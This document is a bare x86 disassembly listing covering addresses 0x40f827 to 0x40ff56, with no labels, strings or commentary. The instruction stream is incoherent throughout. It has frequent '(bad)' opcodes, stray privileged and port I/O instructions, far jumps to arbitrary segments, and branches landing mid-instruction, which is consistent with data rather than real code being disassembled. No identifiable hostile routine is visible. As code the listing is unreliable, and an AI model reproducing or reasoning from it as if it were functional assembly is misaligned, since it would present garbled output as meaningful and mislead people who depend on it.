  40f827:	iret   
  40f828:	pop    ds
  40f829:	out    0x8d,eax
  40f82b:	jmp    0x3ef3:0xfbc17424
  40f832:	jecxz  0x40f808
  40f834:	and    DWORD PTR [eax],esp
  40f836:	and    eax,DWORD PTR [eax]
  40f838:	cmp    BYTE PTR [edi],dl
  40f83a:	mov    edi,0xe3c82a8e
  40f83f:	push   esp
  40f840:	shr    DWORD PTR [ecx],cl
  40f842:	mov    dl,0xd5
  40f844:	dec    ebx
  40f845:	ret    0x1076
  40f848:	(bad)  
  40f849:	jmp    0x40f7fb
  40f84b:	retf   
  40f84c:	imul   BYTE PTR [bp+si]
  40f84f:	dec    edi
  40f850:	ffree  st(7)
  40f852:	nop
  40f853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f854:	jb     0x40f81f
  40f856:	cs jl  0x40f837
  40f859:	ret    0xb72d
  40f85c:	dec    esp
  40f85d:	jmp    0x40f81d
  40f85f:	pusha  
  40f860:	cmp    DWORD PTR [edx+0x8],ecx
  40f863:	mov    al,0xb2
  40f865:	sub    eax,esi
  40f867:	dec    ebx
  40f868:	fwait
  40f869:	je     0x40f8a2
  40f86b:	das    
  40f86c:	or     DWORD PTR [edx],0x23
  40f86f:	shl    DWORD PTR [edx-0x24],1
  40f872:	push   ss
  40f873:	inc    edi
  40f874:	push   cs
  40f875:	add    edx,DWORD PTR ds:0x3002b430
  40f87b:	mov    dl,0x42
  40f87d:	push   eax
  40f87e:	shl    BYTE PTR [ecx],cl
  40f880:	xor    bh,BYTE PTR [edx-0x666a4625]
  40f886:	cs and al,dl
  40f889:	cmp    BYTE PTR [edi+0x35],0xd1
  40f88d:	test   eax,0x6bf8a09b
  40f892:	adc    dh,BYTE PTR [esi+0x27]
  40f895:	pusha  
  40f896:	(bad)  
  40f897:	out    dx,eax
  40f898:	adc    edi,DWORD PTR [esi]
  40f89a:	add    al,BYTE PTR [esi+0x3a]
  40f89d:	jns    0x40f8b1
  40f89f:	aam    0xc3
  40f8a1:	lahf   
  40f8a2:	adc    eax,0xe9d92917
  40f8a7:	daa    
  40f8a8:	inc    ebx
  40f8a9:	cmp    cl,al
  40f8ab:	in     eax,0xf7
  40f8ad:	cmp    esi,ecx
  40f8af:	retf   0x4fe6
  40f8b2:	aam    0xa8
  40f8b4:	cdq    
  40f8b5:	js     0x40f929
  40f8b7:	clc    
  40f8b8:	idiv   DWORD PTR [edx+0x43bb6295]
  40f8be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8bf:	add    ch,dh
  40f8c1:	add    DWORD PTR [esi+0x25ba5bf9],eax
  40f8c7:	fwait
  40f8c8:	xchg   esi,eax
  40f8c9:	jnp    0x40f853
  40f8cb:	add    edi,DWORD PTR [eax+0x2486033f]
  40f8d1:	test   BYTE PTR [eax+0x71],al
  40f8d4:	xchg   ebp,eax
  40f8d5:	cdq    
  40f8d6:	ret    
  40f8d7:	sar    DWORD PTR [edi+0x58],0x8c
  40f8db:	stc    
  40f8dc:	(bad)  
  40f8dd:	loope  0x40f8a2
  40f8df:	jb     0x40f8ce
  40f8e1:	and    DWORD PTR [esi+0x33],esi
  40f8e4:	push   ebx
  40f8e5:	dec    eax
  40f8e6:	push   es
  40f8e7:	fdiv   st,st(5)
  40f8e9:	(bad)  
  40f8ea:	dec    ecx
  40f8eb:	jg     0x40f956
  40f8ed:	and    BYTE PTR [ebx+0x72],0x91
  40f8f1:	ss xchg ebx,eax
  40f8f3:	es push cs
  40f8f5:	xchg   ebx,eax
  40f8f6:	aaa    
  40f8f7:	test   eax,0xfda1a837
  40f8fc:	inc    esp
  40f8fd:	push   cs
  40f8fe:	sub    ah,BYTE PTR [eax]
  40f900:	jne    0x40f961
  40f902:	les    esp,FWORD PTR es:[ebx]
  40f905:	pop    ss
  40f906:	std    
  40f907:	jecxz  0x40f933
  40f909:	push   esp
  40f90a:	fs mov bl,0x4
  40f90d:	lods   eax,DWORD PTR ds:[esi]
  40f90e:	push   esi
  40f90f:	sbb    DWORD PTR ds:0x1129c388,eax
  40f915:	mov    edi,0x3a11bfcd
  40f91a:	(bad)  
  40f91b:	jo     0x40f8b6
  40f91d:	test   BYTE PTR ds:0xf0125957,0x20
  40f924:	mov    al,ds:0xd3688fb2
  40f929:	push   ebp
  40f92a:	imul   ebx,eax,0xffffffae
  40f92d:	lods   eax,DWORD PTR ds:[esi]
  40f92e:	dec    esp
  40f92f:	and    DWORD PTR [ebx+0x774ce90e],0xffffffd5
  40f936:	jne    0x40f8d8
  40f938:	xor    DWORD PTR [ebx],ebp
  40f93a:	sbb    al,0xfa
  40f93c:	or     BYTE PTR [edx],0xc3
  40f93f:	mov    al,ds:0x8a4e747d
  40f944:	aad    0xf4
  40f946:	pop    esp
  40f947:	popa   
  40f948:	pop    dx
  40f94a:	ss loop 0x40f980
  40f94d:	(bad)  [esp+eax*4-0x27]
  40f951:	les    esp,FWORD PTR [ecx]
  40f953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f954:	add    eax,0x1806fd81
  40f959:	mov    ebx,0x67b99d2b
  40f95e:	je     0xcc50741d
  40f964:	mov    cl,0xa6
  40f966:	or     BYTE PTR [esi-0x53c53a4],dl
  40f96c:	sub    bl,BYTE PTR ds:0x3f6619c
  40f972:	dec    esi
  40f973:	(bad)  
  40f974:	push   0xffffffcc
  40f976:	cmc    
  40f977:	jmp    0x9ac0db7b
  40f97c:	fwait
  40f97d:	inc    esp
  40f97e:	xor    al,0x2d
  40f980:	xor    DWORD PTR [esi-0x1f875376],ebp
  40f986:	xor    eax,0xc10e01cb
  40f98b:	mov    al,0xa0
  40f98d:	rcl    DWORD PTR [edi],1
  40f98f:	imul   BYTE PTR [ecx+0x4b]
  40f992:	xchg   DWORD PTR [ecx-0x6b],ebx
  40f995:	xor    BYTE PTR [edi-0x8ac4ee7],bl
  40f99b:	cmp    eax,DWORD PTR [ebx+0x200be212]
  40f9a1:	out    0xfa,al
  40f9a3:	xor    ah,bl
  40f9a5:	in     al,dx
  40f9a6:	dec    eax
  40f9a7:	jl     0x40f9d2
  40f9a9:	lea    ebx,[ebp+eax*4+0x3d]
  40f9ad:	dec    eax
  40f9ae:	stc    
  40f9af:	adc    DWORD PTR [esi-0xdd1edf7],esp
  40f9b5:	push   ss
  40f9b6:	add    DWORD PTR [edi+0x34],0x66
  40f9ba:	mov    ecx,0x2fb2d145
  40f9bf:	das    
  40f9c0:	scas   eax,DWORD PTR es:[edi]
  40f9c1:	add    edx,DWORD PTR [ecx-0xbfc50a]
  40f9c7:	xor    al,0x4b
  40f9c9:	int    0x34
  40f9cb:	icebp  
  40f9cc:	xchg   ebx,eax
  40f9cd:	nop
  40f9ce:	sbb    bl,BYTE PTR [ecx+0x54]
  40f9d1:	jmp    0xf68f:0xd6778b90
  40f9d8:	es xchg edx,eax
  40f9da:	mov    ah,0x24
  40f9dc:	pusha  
  40f9dd:	pop    eax
  40f9de:	clc    
  40f9df:	and    eax,0x276b3eac
  40f9e4:	mov    al,ds:0x83d1f9c6
  40f9e9:	mov    ecx,0xf6254792
  40f9ee:	rcr    DWORD PTR [ebx-0x34bf190e],1
  40f9f4:	pop    edi
  40f9f5:	rol    DWORD PTR [esi+0x744ab02c],0x4f
  40f9fc:	sbb    ecx,ebp
  40f9fe:	jecxz  0x40fa22
  40fa00:	sti    
  40fa01:	cmp    al,0x34
  40fa03:	lahf   
  40fa04:	jmp    0xb4a94203
  40fa09:	fsubr  QWORD PTR [ecx-0x2e9ea154]
  40fa0f:	sbb    al,0x6f
  40fa11:	adc    DWORD PTR [edi-0x2f],ebp
  40fa14:	adc    DWORD PTR [edi],ecx
  40fa16:	mov    dl,0xbe
  40fa18:	mov    edx,edx
  40fa1a:	jmp    0xea2f1f8
  40fa1f:	adc    DWORD PTR [ecx-0xf],esp
  40fa22:	(bad)  
  40fa23:	int3   
  40fa24:	sub    al,BYTE PTR [ebx]
  40fa26:	out    dx,eax
  40fa27:	call   0xfdf1:0x994f845c
  40fa2e:	jge    0x40f9bf
  40fa30:	cmc    
  40fa31:	mov    esp,0xf7147286
  40fa36:	or     al,0xb6
  40fa38:	mov    ah,0x25
  40fa3a:	fcmovbe st,st(7)
  40fa3c:	jecxz  0x40fa4f
  40fa3e:	or     BYTE PTR [ebp+edi*1-0x16],0xae
  40fa43:	dec    ebx
  40fa44:	xchg   ebp,eax
  40fa45:	ins    DWORD PTR es:[edi],dx
  40fa46:	sub    BYTE PTR [eax+0x48d6d15e],dl
  40fa4c:	dec    ebp
  40fa4d:	iret   
  40fa4e:	mov    ss,WORD PTR [edi]
  40fa50:	add    eax,DWORD PTR [edi+0x2eea38d1]
  40fa56:	pop    esi
  40fa57:	sbb    eax,0x8174ac42
  40fa5c:	cdq    
  40fa5d:	repz cdq 
  40fa5f:	ret    
  40fa60:	lahf   
  40fa61:	ins    DWORD PTR es:[edi],dx
  40fa62:	loop   0x40f9e6
  40fa64:	add    DWORD PTR [ecx+edi*2],edi
  40fa67:	scas   al,BYTE PTR es:[edi]
  40fa68:	imul   ebp,DWORD PTR [ebx+ebp*2],0x4c
  40fa6c:	aad    0x33
  40fa6e:	add    cl,BYTE PTR [edi+0x54]
  40fa71:	jo     0x40fa88
  40fa73:	mov    dl,0x33
  40fa75:	dec    ebx
  40fa76:	fwait
  40fa77:	repnz push ss
  40fa79:	jno    0x40fa56
  40fa7b:	jmp    0x40fae9
  40fa7d:	popf   
  40fa7e:	push   0xcb2cac3b
  40fa83:	in     eax,0x1c
  40fa85:	mov    ah,0x6
  40fa87:	std    
  40fa88:	lds    edx,FWORD PTR [ebx-0x7]
  40fa8b:	inc    esi
  40fa8c:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa8e:	pop    ebp
  40fa8f:	push   cs
  40fa90:	int3   
  40fa91:	shl    BYTE PTR [ecx-0x5e],1
  40fa94:	dec    ebx
  40fa95:	out    0x7e,al
  40fa97:	sbb    DWORD PTR [eax+0x1f538d54],edx
  40fa9d:	sahf   
  40fa9e:	ret    0x7a12
  40faa1:	sub    BYTE PTR [ecx],0x6e
  40faa4:	dec    edx
  40faa5:	push   edi
  40faa6:	jno    0x40fa85
  40faa8:	sti    
  40faa9:	test   edi,eax
  40faab:	sub    cl,BYTE PTR [ebx-0x5e4e2c30]
  40fab1:	mov    ecx,0x67a48e83
  40fab6:	cwde   
  40fab7:	push   0x7e
  40fab9:	imul   esp,DWORD PTR [edi-0x1],0xae62b424
  40fac0:	(bad)  
  40fac1:	cmp    edx,DWORD PTR [edi+0x5379abbd]
  40fac7:	push   0x39
  40fac9:	fsub   DWORD PTR [eax+0x38c6d31b]
  40facf:	inc    edx
  40fad0:	jmp    0x40fa5e
  40fad2:	je     0x40fb31
  40fad4:	pop    ebp
  40fad5:	adc    al,0x29
  40fad7:	pop    edi
  40fad8:	gs retf 
  40fada:	or     ecx,edx
  40fadc:	mov    bh,0x3a
  40fade:	xchg   edi,eax
  40fadf:	adc    ecx,DWORD PTR [eax+0x1]
  40fae2:	adc    DWORD PTR [ebp+ecx*1+0x28d1bbb0],0x8598317
  40faed:	xor    al,0x1f
  40faef:	or     al,0x7c
  40faf1:	rol    dh,0xa
  40faf4:	mov    bl,0x60
  40faf6:	dec    ebp
  40faf7:	aas    
  40faf8:	clc    
  40faf9:	sbb    edi,DWORD PTR [eax]
  40fafb:	adc    DWORD PTR [edi-0x11],edx
  40fafe:	les    ebp,FWORD PTR [edi]
  40fb00:	repz bound edi,QWORD PTR [eax+0x2]
  40fb04:	not    ebx
  40fb06:	in     al,dx
  40fb07:	xor    dh,0x2d
  40fb0a:	xchg   edi,eax
  40fb0b:	dec    ebp
  40fb0c:	stc    
  40fb0d:	sbb    eax,0x749f06f3
  40fb12:	and    BYTE PTR [esi-0x7f41db9b],cl
  40fb18:	jg     0x40fb4c
  40fb1a:	xor    DWORD PTR [ecx],ebp
  40fb1c:	push   ebx
  40fb1d:	mov    al,ds:0x944bfc39
  40fb22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb23:	or     BYTE PTR [edi-0x2f5fbb34],0x7e
  40fb2a:	mov    bh,0x4f
  40fb2c:	rcl    DWORD PTR [ebx+ebx*8+0xe8c5706],cl
  40fb33:	fstp   TBYTE PTR [edx+0x77de6858]
  40fb39:	lds    edx,FWORD PTR ds:0xd3e4dfe2
  40fb3f:	aam    0x2
  40fb41:	test   al,0xb1
  40fb43:	bound  edx,QWORD PTR [ebx-0x696df316]
  40fb49:	add    eax,0xf86e9ec7
  40fb4e:	and    DWORD PTR [ebx],ebp
  40fb50:	imul   ecx,ecx,0xffffffc0
  40fb53:	pushf  
  40fb54:	mov    edx,0x80f04cae
  40fb59:	stc    
  40fb5a:	cli    
  40fb5b:	xchg   esi,eax
  40fb5c:	fdivr  QWORD PTR [edi+0x243d61bf]
  40fb62:	cmp    BYTE PTR [edi-0x21],0x9a
  40fb66:	scas   eax,DWORD PTR es:[edi]
  40fb67:	outs   dx,BYTE PTR ds:[esi]
  40fb68:	mov    ch,0xa3
  40fb6a:	push   0x5a
  40fb6c:	mov    ch,0xa3
  40fb6e:	repz scas eax,DWORD PTR es:[edi]
  40fb70:	xchg   ebp,eax
  40fb71:	daa    
  40fb72:	addr16 and eax,0xaa9a3d5a
  40fb78:	retf   0x87ec
  40fb7b:	ds cmc 
  40fb7d:	sbb    eax,0x17ea6599
  40fb82:	mov    eax,ds:0x3a5211f0
  40fb87:	mov    ds:0xafe1fd41,eax
  40fb8c:	clc    
  40fb8d:	mov    edx,ecx
  40fb8f:	scas   al,BYTE PTR es:[edi]
  40fb90:	and    bl,BYTE PTR [edi+0x667d5c0b]
  40fb96:	(bad)  
  40fb97:	outs   dx,BYTE PTR ds:[esi]
  40fb98:	in     al,0x3b
  40fb9a:	repnz cwde 
  40fb9c:	xchg   DWORD PTR [esp+ebx*8-0x1],eax
  40fba0:	or     ah,BYTE PTR [edi]
  40fba2:	cwde   
  40fba3:	jns    0x40fbdb
  40fba5:	xor    eax,0x7468ccbb
  40fbaa:	xchg   edi,eax
  40fbab:	jg     0x40fb40
  40fbad:	shl    DWORD PTR [esi+0x52],0x1d
  40fbb1:	retf   
  40fbb2:	neg    cl
  40fbb4:	(bad)  
  40fbb5:	jg     0x40fb8b
  40fbb7:	push   ss
  40fbb8:	xchg   ebx,eax
  40fbb9:	invd   
  40fbbb:	pop    es
  40fbbc:	and    al,0x19
  40fbbe:	pop    esp
  40fbbf:	pop    ecx
  40fbc0:	mov    ah,0x54
  40fbc2:	popf   
  40fbc3:	daa    
  40fbc4:	repz jb 0x40fb6d
  40fbc7:	sbb    eax,DWORD PTR [esp+edx*4]
  40fbca:	int3   
  40fbcb:	adc    al,0xe5
  40fbcd:	das    
  40fbce:	aaa    
  40fbcf:	stc    
  40fbd0:	lahf   
  40fbd1:	adc    cl,BYTE PTR [edi-0x7dd400c2]
  40fbd7:	arpl   WORD PTR [ecx+0x52a3ba9a],di
  40fbdd:	outs   dx,DWORD PTR ds:[esi]
  40fbde:	mov    ecx,0x76eb9222
  40fbe3:	jmp    0xdc60:0x74dfa5f8
  40fbea:	clc    
  40fbeb:	gs out 0x70,eax
  40fbee:	pop    eax
  40fbef:	jg     0x40fc35
  40fbf1:	mov    ecx,DWORD PTR [eax]
  40fbf3:	inc    eax
  40fbf4:	xchg   edx,eax
  40fbf5:	(bad)  
  40fbf6:	ficomp DWORD PTR [eax-0x5aa1d0be]
  40fbfc:	outs   dx,BYTE PTR ds:[esi]
  40fbfd:	nop
  40fbfe:	adc    eax,0x5a2ef121
  40fc03:	pop    ss
  40fc04:	ja     0x40fbc1
  40fc06:	int    0xc4
  40fc08:	aaa    
  40fc09:	mov    cl,0x29
  40fc0b:	push   0xffffffd7
  40fc0d:	xor    BYTE PTR [eax-0x38],cl
  40fc10:	das    
  40fc11:	jae    0x40fc59
  40fc13:	popf   
  40fc14:	or     ah,0x14
  40fc17:	outs   dx,DWORD PTR ds:[esi]
  40fc18:	fdivp  st(3),st
  40fc1a:	cmp    al,0x76
  40fc1c:	loop   0x40fc3f
  40fc1e:	fadd   DWORD PTR [esp+ecx*1]
  40fc21:	push   ebp
  40fc22:	jecxz  0x40fc9e
  40fc24:	js     0x40fc5e
  40fc26:	gs jne 0x40fc5a
  40fc29:	(bad)  
  40fc2a:	jmp    0x40fc9e
  40fc2c:	sbb    bh,BYTE PTR [edx-0x381da8d8]
  40fc32:	mov    edi,0xb5851409
  40fc37:	push   0x48
  40fc39:	cli    
  40fc3a:	mov    eax,0x7cbf765a
  40fc3f:	add    eax,0x454cf7c3
  40fc44:	jge    0x40fc71
  40fc46:	pop    ebx
  40fc47:	fmul   DWORD PTR [esi+ebp*2]
  40fc4a:	mov    BYTE PTR [edi],bh
  40fc4c:	mov    dh,0xd9
  40fc4e:	mov    edx,0xadde4c82
  40fc53:	cmovg  ebp,DWORD PTR [eax]
  40fc56:	(bad)  
  40fc57:	stos   BYTE PTR es:[edi],al
  40fc58:	jbe    0x40fc27
  40fc5a:	add    al,0xa3
  40fc5c:	stc    
  40fc5d:	xor    edi,DWORD PTR [edx]
  40fc5f:	pop    edi
  40fc60:	je     0x40fbed
  40fc62:	adc    DWORD PTR [esi+0x50d77e65],edi
  40fc68:	pop    esi
  40fc69:	addr16 iret 
  40fc6b:	inc    esp
  40fc6c:	out    0xa,eax
  40fc6e:	mov    ds:0x826e231e,eax
  40fc73:	mov    bl,0x72
  40fc75:	nop
  40fc76:	cmc    
  40fc77:	jge    0x40fcaa
  40fc79:	(bad)  
  40fc7a:	jg     0x40fc12
  40fc7c:	rol    DWORD PTR [ebx],cl
  40fc7e:	ins    DWORD PTR es:[edi],dx
  40fc7f:	cmp    al,0xfd
  40fc81:	icebp  
  40fc82:	ja     0x40fcb4
  40fc84:	push   esi
  40fc85:	mov    dl,0x33
  40fc87:	and    DWORD PTR ds:0x91e2ec9d,ebp
  40fc8d:	push   ds
  40fc8e:	arpl   WORD PTR [esi+0xa8b3fc],dx
  40fc94:	(bad)  
  40fc95:	jb     0x40fc53
  40fc97:	cmp    ecx,edi
  40fc99:	inc    ebp
  40fc9a:	sbb    edi,eax
  40fc9c:	and    bh,dl
  40fc9e:	hlt    
  40fc9f:	test   eax,0x68844a20
  40fca4:	lahf   
  40fca5:	in     al,dx
  40fca6:	ret    
  40fca7:	sbb    BYTE PTR [edi],ah
  40fca9:	bound  esp,QWORD PTR [ecx]
  40fcab:	outs   dx,BYTE PTR ds:[esi]
  40fcac:	(bad)  
  40fcad:	push   esi
  40fcae:	sar    bl,0x7f
  40fcb1:	xchg   ebx,eax
  40fcb2:	cmp    ah,BYTE PTR [ecx-0x5834eb4b]
  40fcb8:	test   eax,0x8e2560a9
  40fcbd:	jmp    0xb437:0xe143bd15
  40fcc4:	xchg   BYTE PTR [edx+0x5],ah
  40fcc7:	icebp  
  40fcc8:	or     al,0xd0
  40fcca:	(bad)  
  40fccb:	mov    edi,0x9a495379
  40fcd0:	sahf   
  40fcd1:	jle    0x40fc56
  40fcd3:	retf   
  40fcd4:	aam    0x2a
  40fcd6:	dec    esp
  40fcd7:	dec    esp
  40fcd8:	jbe    0x40fcfc
  40fcda:	call   0xfbde:0x5f6e8c01
  40fce1:	sub    DWORD PTR [ebx+ebx*4],esp
  40fce4:	outs   dx,BYTE PTR ds:[esi]
  40fce5:	jecxz  0x40fcd0
  40fce7:	cmp    dh,BYTE PTR [ebp+0x2f]
  40fcea:	xor    edi,0xd8ed4c5e
  40fcf0:	jnp    0x40fd27
  40fcf2:	fild   WORD PTR [ebx]
  40fcf4:	jmp    FWORD PTR [edi+edi*2]
  40fcf7:	sbb    al,0x27
  40fcf9:	pop    eax
  40fcfa:	jge    0x40fcdf
  40fcfc:	adc    BYTE PTR [ebx+edi*8],0x44
  40fd00:	test   dh,ch
  40fd02:	mov    dl,0x1
  40fd04:	cmp    BYTE PTR [ecx],0xae
  40fd07:	xchg   edi,eax
  40fd08:	aad    0xe5
  40fd0a:	(bad)  
  40fd0b:	xor    DWORD PTR [ebp-0x2a],eax
  40fd0e:	ror    ecx,0x45
  40fd11:	int3   
  40fd12:	sbb    al,0xc0
  40fd14:	push   ss
  40fd15:	mov    eax,0xab94649d
  40fd1a:	pushf  
  40fd1b:	outs   dx,DWORD PTR ds:[esi]
  40fd1c:	pusha  
  40fd1d:	cmp    BYTE PTR [eax-0x75],dl
  40fd20:	xchg   ebp,eax
  40fd21:	add    bh,BYTE PTR [ebx]
  40fd23:	push   ebp
  40fd24:	stos   BYTE PTR es:[edi],al
  40fd25:	std    
  40fd26:	retf   0x7e7b
  40fd29:	jle    0x40fd39
  40fd2b:	and    ecx,edi
  40fd2d:	test   al,0xa
  40fd2f:	es ss gs adc eax,0xd193c98
  40fd37:	pop    eax
  40fd38:	jle    0x40fd2f
  40fd3a:	inc    edi
  40fd3b:	mov    ebp,0xd048b7d4
  40fd40:	(bad)  [ebp-0x41]
  40fd43:	pop    esi
  40fd44:	jnp    0x40fcdd
  40fd46:	loopne 0x40fd3b
  40fd48:	push   ebp
  40fd49:	dec    edi
  40fd4a:	pushf  
  40fd4b:	fbld   TBYTE PTR [eax+esi*4-0x4e]
  40fd4f:	ins    DWORD PTR es:[edi],dx
  40fd50:	fisubr DWORD PTR [edx]
  40fd52:	imul   ecx,DWORD PTR [ebx],0xc1740f95
  40fd58:	hlt    
  40fd59:	cld    
  40fd5a:	(bad)  
  40fd5b:	neg    BYTE PTR [eax]
  40fd5d:	cmp    al,0x89
  40fd5f:	mov    bh,0xaf
  40fd61:	xor    BYTE PTR [eax],dl
  40fd63:	pop    es
  40fd64:	add    BYTE PTR [edx+ebx*1+0x62a45fb6],ah
  40fd6b:	jecxz  0x40fdac
  40fd6d:	jecxz  0x40fdeb
  40fd6f:	or     DWORD PTR [eax+0x226a8fd3],0xd7c1a187
  40fd79:	jae    0x40fd83
  40fd7b:	xchg   ebx,eax
  40fd7c:	outs   dx,BYTE PTR ds:[esi]
  40fd7d:	imul   ebp,edi,0x58997925
  40fd83:	fwait
  40fd84:	push   esp
  40fd85:	mov    BYTE PTR ds:0x3a4743d7,ch
  40fd8b:	rol    BYTE PTR [esi-0x6cb0f90c],0x79
  40fd92:	out    dx,eax
  40fd93:	mov    cs,WORD PTR [eax+0x45]
  40fd96:	mov    edx,0x379d515b
  40fd9b:	cmp    eax,DWORD PTR [esi+edi*8]
  40fd9e:	ins    DWORD PTR es:[edi],dx
  40fd9f:	mov    ecx,0x2a37716b
  40fda4:	push   ecx
  40fda5:	cmp    DWORD PTR [ebx],esi
  40fda7:	cmc    
  40fda8:	psraw  mm5,mm5
  40fdab:	mov    ecx,0x35c765b7
  40fdb0:	sub    al,0xcf
  40fdb2:	xchg   ebx,edi
  40fdb4:	lods   eax,DWORD PTR ds:[esi]
  40fdb5:	push   bx
  40fdb7:	sub    BYTE PTR [ebp-0x66138dd9],ah
  40fdbd:	push   esi
  40fdbe:	inc    edx
  40fdbf:	lea    ebp,[ebp-0x5e90835b]
  40fdc5:	jecxz  0x40fdd4
  40fdc7:	(bad)  
  40fdc8:	iret   
  40fdc9:	mov    DWORD PTR ds:0xcb92bf68,esp
  40fdcf:	or     al,0x48
  40fdd1:	inc    ecx
  40fdd2:	push   ebp
  40fdd3:	jne    0x40fd9c
  40fdd5:	or     al,0x71
  40fdd7:	inc    esp
  40fdd8:	or     DWORD PTR [ebp-0x23fc87db],esi
  40fdde:	int    0x91
  40fde0:	pop    ss
  40fde1:	pop    ds
  40fde2:	add    al,0x31
  40fde4:	hlt    
  40fde5:	and    dl,BYTE PTR [eax+0x46]
  40fde8:	xchg   esp,eax
  40fde9:	fisub  WORD PTR [ebx-0x6e680def]
  40fdef:	repnz fcmovnb st,st(2)
  40fdf2:	dec    edx
  40fdf3:	stos   BYTE PTR es:[edi],al
  40fdf4:	ds adc al,0xfd
  40fdf7:	xor    al,0xaa
  40fdf9:	enter  0xf81c,0xbe
  40fdfd:	test   DWORD PTR [edx-0x282b0943],0xb33cfcef
  40fe07:	sbb    ecx,DWORD PTR [ebp+0x7baa06f4]
  40fe0d:	lods   al,BYTE PTR ds:[esi]
  40fe0e:	mov    DWORD PTR [ecx],esp
  40fe10:	rcl    BYTE PTR [edi+edi*4],cl
  40fe13:	adc    edx,DWORD PTR [ebx]
  40fe15:	pop    es
  40fe16:	push   ecx
  40fe17:	xchg   esp,esi
  40fe19:	xor    al,0x9d
  40fe1b:	add    al,0xad
  40fe1d:	pop    esi
  40fe1e:	test   al,0xd2
  40fe20:	(bad)  
  40fe21:	stos   BYTE PTR es:[edi],al
  40fe22:	and    eax,0xe35b094b
  40fe27:	push   edi
  40fe28:	int    0x0
  40fe2a:	or     BYTE PTR [eax+0x240bbefa],al
  40fe30:	es je  0x40fea4
  40fe33:	mov    cl,BYTE PTR [ebp+0x46]
  40fe36:	nop
  40fe37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe38:	lods   al,BYTE PTR ds:[esi]
  40fe39:	sub    BYTE PTR [eax],ch
  40fe3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe3c:	popa   
  40fe3d:	stos   DWORD PTR es:[edi],eax
  40fe3e:	xchg   DWORD PTR [esi+0x64d4f078],ebp
  40fe44:	pop    edi
  40fe45:	inc    eax
  40fe46:	fcmovnb st,st(4)
  40fe48:	call   0x3746fed0
  40fe4d:	in     al,dx
  40fe4e:	in     eax,dx
  40fe4f:	cli    
  40fe50:	in     eax,0xcb
  40fe52:	and    al,0xae
  40fe54:	lods   eax,DWORD PTR ds:[si]
  40fe56:	jmp    0x40fe8c
  40fe58:	repnz fild QWORD PTR [esi+0xe]
  40fe5c:	das    
  40fe5d:	jge    0x40fe26
  40fe5f:	scas   eax,DWORD PTR es:[edi]
  40fe60:	and    BYTE PTR [esi],bl
  40fe62:	cmp    cl,BYTE PTR [ebp-0x5c]
  40fe65:	dec    esp
  40fe66:	add    DWORD PTR [ecx-0x492b06a8],esi
  40fe6c:	test   eax,0xac76e15
  40fe71:	and    BYTE PTR [esi-0x7d],al
  40fe74:	in     eax,dx
  40fe75:	imul   eax,edi,0x1530385e
  40fe7b:	ja     0x40feda
  40fe7d:	add    ebx,edx
  40fe7f:	mov    BYTE PTR [edx-0x53a7da03],bh
  40fe85:	std    
  40fe86:	push   edi
  40fe87:	out    dx,al
  40fe88:	out    dx,eax
  40fe89:	call   0x6666e60b
  40fe8e:	test   eax,0xbc31411
  40fe93:	lea    edx,ds:0x6d35e68b
  40fe99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe9a:	add    bh,dh
  40fe9c:	inc    edx
  40fe9d:	mov    ds:0x70cdde93,al
  40fea2:	mov    al,0x65
  40fea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fea5:	outs   dx,BYTE PTR ds:[esi]
  40fea6:	xor    al,0x62
  40fea8:	shr    BYTE PTR [ecx-0x33],cl
  40feab:	sbb    edx,ebx
  40fead:	fnstcw WORD PTR [ebp+0x74]
  40feb0:	or     dh,BYTE PTR [edx]
  40feb2:	cld    
  40feb3:	mov    WORD PTR [ebp-0x2042997a],cs
  40feb9:	aad    0x57
  40febb:	dec    eax
  40febc:	push   0x2d
  40febe:	jo     0x40fed2
  40fec0:	jle    0x40fe53
  40fec2:	stc    
  40fec3:	adc    al,0x70
  40fec5:	push   cs
  40fec6:	push   0x58
  40fec8:	outs   dx,BYTE PTR ds:[esi]
  40fec9:	lods   eax,DWORD PTR ds:[esi]
  40feca:	pop    ss
  40fecb:	popf   
  40fecc:	cmc    
  40fecd:	push   0xffffffc4
  40fecf:	sub    al,0x3e
  40fed1:	out    dx,al
  40fed2:	mov    edx,cs
  40fed4:	gs xchg esp,eax
  40fed6:	fld    DWORD PTR [ebp+esi*2-0x3f7c81b9]
  40fedd:	sub    DWORD PTR [eax-0x1cb77755],0xfffffff7
  40fee4:	xor    DWORD PTR [ebp+0x34],eax
  40fee7:	sbb    DWORD PTR [ecx-0x3c],0x15
  40feeb:	sub    BYTE PTR [edx],ah
  40feed:	iret   
  40feee:	aaa    
  40feef:	cs std 
  40fef1:	mov    esi,0x18cc2aeb
  40fef6:	icebp  
  40fef7:	sub    eax,0xb290204
  40fefc:	jp     0x40ff63
  40fefe:	push   0xbeea9648
  40ff03:	int    0x8b
  40ff05:	mov    eax,0xb22a5d4b
  40ff0a:	sbb    al,0xc7
  40ff0c:	sbb    eax,ebp
  40ff0e:	icebp  
  40ff0f:	test   eax,0xd2ed9a3a
  40ff14:	sahf   
  40ff15:	pop    edi
  40ff16:	mov    eax,ds:0x75c5e127
  40ff1b:	jp     0x40ff58
  40ff1d:	fsubr  QWORD PTR [esi]
  40ff1f:	fmul   QWORD PTR [eax-0x4f]
  40ff22:	aas    
  40ff23:	adc    al,0xc8
  40ff25:	test   BYTE PTR [eax-0x3286436e],cl
  40ff2b:	add    ah,dh
  40ff2d:	inc    ebp
  40ff2e:	xchg   edx,eax
  40ff2f:	cmp    al,0xd9
  40ff31:	int    0x23
  40ff33:	add    DWORD PTR [edx+edi*1+0x2f],ebx
  40ff37:	dec    ecx
  40ff38:	sti    
  40ff39:	inc    ebp
  40ff3a:	push   ebp
  40ff3b:	hlt    
  40ff3c:	xor    eax,0x7834aac9
  40ff41:	fisubr DWORD PTR [esi]
  40ff43:	stos   DWORD PTR es:[edi],eax
  40ff44:	les    edx,FWORD PTR [eax+esi*4-0x2b]
  40ff48:	add    eax,0x6568abf4
  40ff4d:	retf   
  40ff4e:	inc    esi
  40ff4f:	sbb    bh,BYTE PTR [ecx-0x229bfd08]
  40ff55:	scas   eax,DWORD PTR es:[edi]
  40ff56:	dec    edx
